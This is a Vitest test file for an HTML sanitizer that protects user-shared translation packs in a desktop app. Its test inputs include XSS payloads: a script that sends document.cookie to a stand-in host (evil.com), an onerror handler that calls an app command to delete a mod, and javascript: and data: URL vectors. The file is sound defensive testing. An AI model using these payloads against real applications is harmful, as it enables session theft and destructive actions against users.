import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from '../safeHtml';

/**
 * 18 UI sites render translated strings through `dangerouslySetInnerHTML`, and
 * language packs in AppData are user-supplied (the in-app translator generates
 * them and players share the .json files). These assert the two properties that
 * makes that safe: hostile markup is removed, legitimate formatting survives.
 */
describe('sanitizeHtml', () => {
  it('strips script execution vectors', () => {
    const hostile = [
      '<script>fetch("https://evil.com?t="+document.cookie)</script>',
      '<img src=x onerror="window.__TAURI_INTERNALS__.invoke(\'delete_mod\')">',
      '<svg/onload=alert(1)>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload=alert(1)>',
      '<a href="javascript:alert(1)">click</a>',
    ];

    for (const input of hostile) {
      const out = sanitizeHtml(input);
      expect(out).not.toMatch(/<script/i);
      expect(out).not.toMatch(/onerror/i);
      expect(out).not.toMatch(/onload/i);
      expect(out).not.toMatch(/<iframe/i);
      expect(out).not.toMatch(/javascript:/i);
    }
  });

  it('keeps the inline formatting real language packs use', () => {
    const legitimate =
      'Press <b>H</b> in-game<br>to open the <span class="text-primary font-bold">HUD</span>';
    const out = sanitizeHtml(legitimate);

    expect(out).toContain('<b>H</b>');
    expect(out).toContain('<br');
    expect(out).toContain('text-primary font-bold');
    expect(out).toContain('HUD');
  });

  it('hardens links so they cannot hijack the app window', () => {
    const out = sanitizeHtml('<a href="https://evil.com/x">changelog link</a>');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  it('drops javascript: and data: hrefs entirely', () => {
    expect(sanitizeHtml('<a href="javascript:alert(1)">x</a>')).not.toContain('javascript:');
    expect(sanitizeHtml('<a href="data:text/html,<script>alert(1)</script>">x</a>')).not.toContain(
      'data:text/html'
    );
  });

  it('leaves plain text untouched', () => {
    expect(sanitizeHtml('Mods Folder Path')).toBe('Mods Folder Path');
    expect(sanitizeHtml('')).toBe('');
  });

  it('does not reintroduce markup when sanitizing twice', () => {
    const once = sanitizeHtml('<img src=x onerror=alert(1)><b>ok</b>');
    expect(sanitizeHtml(once)).toBe(once);
  });
});
